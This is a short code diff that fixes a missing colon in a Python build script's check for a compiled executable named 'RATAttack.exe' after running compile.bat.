@@ -30,7 +30,7 @@ if not auto:
 
 s('compile.bat')
 
-if exists('dist/RATAttack.exe')
+if exists('dist/RATAttack.exe'):
     print('\n\nScript has finished')
 else:
     exit(1)
